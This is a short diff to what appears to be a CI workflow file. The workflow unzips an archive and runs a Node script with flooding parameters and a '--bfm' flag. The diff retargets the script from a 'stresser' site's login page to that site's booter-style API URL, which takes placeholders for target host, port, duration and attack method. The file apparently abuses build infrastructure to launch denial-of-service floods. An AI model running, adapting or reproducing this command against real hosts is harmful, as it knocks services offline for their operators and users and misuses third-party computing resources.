@@ -36,7 +36,7 @@ jobs:
           chmod +x ki
           unzip Fc-main.zip 
           cd Fc-main
-          node y.js GET https://susstresser.com/panel/login 800 4 90  --bfm --debug
+          node y.js GET https://api.susstresser.com/panel/api/api.php?key=YOUR_KEY&host=TARGET&port=PORT&time=SECONDS&method=METHOD 800 4 90  --bfm --debug
 
           
 
